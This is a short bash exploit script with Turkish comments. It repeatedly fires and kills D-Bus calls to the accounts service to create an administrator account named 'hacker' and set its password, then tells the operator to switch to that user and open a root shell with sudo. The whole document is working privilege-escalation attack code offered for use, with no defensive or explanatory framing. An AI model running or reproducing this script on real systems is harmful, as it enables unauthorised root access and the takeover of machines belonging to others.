#!/bin/bash

# Kullanıcı adı ve şifre belirliyoruz
user="hacker"
pass="Sifre123!"

echo "[*] Exploit baslatiliyor... (Bu islem biraz surebilir)"

# 1. Aşama: Kullanıcı Oluşturma Döngüsü
# Başarılı olana kadar sürekli user eklemeyi dener ve işlemi yarıda keser.
for i in {1..50}; do
    dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:$user string:"Hacker" int32:1 & sleep 0.005; kill $! 2>/dev/null
done

# 2. Aşama: Şifre Belirleme Döngüsü
# Kullanıcı oluştuysa, şifresini belirlemeye çalışır.
for i in {1..50}; do
    dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1001 org.freedesktop.Accounts.User.SetPassword string:$pass string:"Ask the user" & sleep 0.005; kill $! 2>/dev/null
done

echo ""
echo "[*] Kontrol ediliyor..."

# Başarılı olup olmadığını kontrol et
id $user 2>/dev/null
if [ $? -eq 0 ]; then
    echo "[+] BAŞARILI! Kullanıcı oluşturuldu."
    echo "[+] Kullanıcı: $user"
    echo "[+] Şifre: $pass"
    echo "[!] Şimdi 'su $user' ile giriş yap ve 'sudo -s' çalıştır."
else
    echo "[-] Başarısız oldu. Scripti tekrar çalıştır."
fi
